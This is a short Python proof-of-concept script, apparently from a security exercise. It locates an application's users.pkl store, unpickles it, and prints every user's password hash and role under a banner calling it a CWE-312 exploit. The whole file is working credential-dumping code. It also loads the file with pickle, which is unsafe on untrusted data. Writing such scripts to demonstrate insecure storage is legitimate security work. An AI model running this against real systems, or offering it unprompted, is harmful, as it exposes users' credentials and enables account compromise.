import os
import pickle

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

USERS_PATH = os.path.normpath(os.path.join(BASE_DIR, "..", "app", "storage", "users.pkl"))

def main():
    print("[*] Looking for:", USERS_PATH)

    if not os.path.exists(USERS_PATH):
        print("[!] ERROR: users.pkl not found.")
        return

    with open(USERS_PATH, "rb") as f:
        data = pickle.load(f)

    print("\n=== DUMPING USER CREDENTIALS (CWE-312 EXPLOIT) ===")

    if isinstance(data, dict):
        for username, info in data.items():
            print(f"User: {username}")
            print(f"  Password Hash: {info.get('password_hash')}")
            print(f"  Role: {info.get('role')}\n")

    elif isinstance(data, list):
        for entry in data:
            print("User:", entry.get("username"))
            print("  Role:", entry.get("role"), "\n")

if __name__ == "__main__":
    main()
